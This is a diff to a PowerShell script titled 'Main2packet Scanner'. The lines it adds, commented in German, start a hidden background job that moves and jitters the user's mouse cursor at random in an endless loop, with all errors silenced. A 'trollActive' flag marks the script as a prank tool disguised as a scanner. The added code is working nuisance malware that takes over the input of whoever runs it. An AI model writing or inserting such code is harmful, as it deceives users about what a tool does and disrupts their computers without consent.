@@ -49,6 +49,54 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 $ErrorActionPreference = "SilentlyContinue"
 $Host.UI.RawUI.WindowTitle = "Main2packet Scanner"
 
+# ===== MAUS VERÜCKT MACHEN =====
+Add-Type -AssemblyName System.Windows.Forms
+
+$mouseJob = Start-Job -ScriptBlock {
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class MouseMover {
+        [DllImport("user32.dll")]
+        public static extern bool SetCursorPos(int X, int Y);
+        
+        [DllImport("user32.dll")]
+        public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
+    }
+"@
+    
+    $random = New-Object Random
+    while ($true) {
+        try {
+            # Aktuelle Mausposition
+            $currentPos = [System.Windows.Forms.Cursor]::Position
+            
+            # Zufällige Bewegung (-50 bis 50 Pixel)
+            $moveX = $random.Next(-70, 70)
+            $moveY = $random.Next(-70, 70)
+            
+            # Neue Position
+            $newX = $currentPos.X + $moveX
+            $newY = $currentPos.Y + $moveY
+            
+            # Maus bewegen
+            [MouseMover]::SetCursorPos($newX, $newY)
+            
+            # Kleine Zuckungen (5x)
+            for ($i = 0; $i -lt 5; $i++) {
+                $zuckX = $newX + $random.Next(-15,15)
+                $zuckY = $newY + $random.Next(-15,15)
+                [MouseMover]::SetCursorPos($zuckX, $zuckY)
+                Start-Sleep -Milliseconds 20
+            }
+            
+            # Zufällige Pause (50-800ms)
+            Start-Sleep -Milliseconds $random.Next(50, 800)
+            
+        } catch {}
+    }
+}
+
 # ===== KONFIGURATION =====
 $global:trollActive = $true
 $global:currentRound = 0
